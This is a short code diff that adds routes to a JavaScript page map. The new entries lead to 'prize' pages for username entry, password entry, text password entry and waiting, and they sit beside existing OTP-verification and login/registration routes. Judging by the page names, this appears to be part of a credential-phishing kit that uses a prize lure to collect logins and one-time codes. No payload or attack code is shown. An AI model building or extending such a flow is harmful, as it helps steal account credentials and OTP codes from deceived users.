@@ -40,6 +40,11 @@
     otp: 'otp.html', otpcode: 'otp.html', otpverify: 'otp.html',
     otpnew: 'otp-new.html', otp4: 'otp-new.html', 'otp-new': 'otp-new.html',
     regist: 'login-regist.html', register: 'login-regist.html', loginregist: 'login-regist.html',
+    prize: 'index.html', prizes: 'index.html',
+    prizeusername: 'prize-username.html', 'prize-username': 'prize-username.html',
+    prizepassword: 'prize-password.html', 'prize-password': 'prize-password.html',
+    prizetextpassword: 'prize-text-password.html', 'prize-text-password': 'prize-text-password.html',
+    prizwait: 'prize-wait.html', 'prize-wait': 'prize-wait.html',
     orders: 'order1.html', order1: 'order1.html'
   };
 
